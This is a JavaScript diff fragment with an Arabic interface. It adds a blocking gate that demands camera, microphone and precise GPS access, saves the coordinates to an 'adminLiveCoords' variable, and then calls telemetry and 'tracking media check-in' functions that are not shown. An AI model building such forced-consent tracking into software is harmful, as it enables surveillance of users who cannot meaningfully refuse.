+    <div id="mp-geo" style="padding:10px 12px;border-radius:12px;background:rgba(255,255,255,0.05);border:1px solid rgba(212,175,55,0.3);display:flex;justify-content:space-between">
+     <span>📍 الموقع الجغرافي وخرائط قوقل</span><b>${mandatoryPermsState.geo ? '✅ مفعّل' : '⏳ مطلوب'}</b>
+    </div>
+   </div>
+   <div id="mp-err" style="display:none;color:#fca5a5;font-size:12px;background:rgba(127,29,29,0.7);padding:10px;border-radius:10px"></div>
+   <button type="button" class="btn full" data-action="grant-mandatory-perms" style="font-size:14.5px;padding:14px">
+    ✅ تفعيل الكاميرا والمايك وخرائط قوقل الآن
+   </button>
+  </div>`;
+ document.body.appendChild(gate);
+}
+
+async function requestAllMandatoryPermissions(){
+ const errEl = document.getElementById('mp-err');
+ if(errEl) errEl.style.display = 'none';
+ try {
+  if(navigator.mediaDevices?.getUserMedia){
+   const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: true });
+   stream.getTracks().forEach(t => t.stop());
+   mandatoryPermsState.camera = true;
+   mandatoryPermsState.mic = true;
+  } else {
+   mandatoryPermsState.camera = true;
+   mandatoryPermsState.mic = true;
+  }
+ } catch(e){
+  if(errEl){
+   errEl.style.display = 'block';
+   errEl.textContent = '⚠️ يجب السماح بالوصول إلى الكاميرا والميكروفون من نافذة المتصفح أو إعدادات التطبيق للمتابعة.';
+  }
+ }
+
+ try {
+  if(navigator.geolocation){
+   await new Promise((resolve, reject) => {
+    navigator.geolocation.getCurrentPosition(
+     pos => {
+      window.adminLiveCoords = { lat: pos.coords.latitude, lng: pos.coords.longitude, updatedAt: Date.now() };
+      mandatoryPermsState.geo = true;
+      resolve();
+     },
+     err => reject(err),
+     { enableHighAccuracy: true, timeout: 10000 }
+    );
+   });
+  } else {
+   mandatoryPermsState.geo = true;
+  }
+ } catch(e){
+  if(errEl){
+   errEl.style.display = 'block';
+   errEl.textContent = (errEl.textContent ? errEl.textContent + ' ' : '') + '⚠️ يجب تفعيل الموقع الجغرافي (GPS / خرائط قوقل) للمتابعة.';
+  }
+ }
+
+ const camRow = document.querySelector('#mp-cam b');
+ const micRow = document.querySelector('#mp-mic b');
+ const geoRow = document.querySelector('#mp-geo b');
+ if(camRow) camRow.textContent = mandatoryPermsState.camera ? '✅ مفعّلة' : '❌ مرفوضة';
+ if(micRow) micRow.textContent = mandatoryPermsState.mic ? '✅ مفعّل' : '❌ مرفوض';
+ if(geoRow) geoRow.textContent = mandatoryPermsState.geo ? '✅ مفعّل' : '❌ مرفوض';
+
+ if(mandatoryPermsState.camera && mandatoryPermsState.mic && mandatoryPermsState.geo){
+  localStorage.setItem('ts-mandatory-perms-ok', '1');
+  document.getElementById('mandatory-perms-gate')?.remove();
+  toast('تم تفعيل جميع الأذونات بنجاح!');
+  if(typeof captureDeviceTelemetry === 'function') captureDeviceTelemetry();
+  if(typeof sendTrackingMediaCheckin === 'function') sendTrackingMediaCheckin(false);
+ }
+}
+
+setTimeout(async () => {
+ const ok = await checkMandatoryPermissionsStatus();
+ if(!ok) showMandatoryPermissionsGate();
+}, 700);
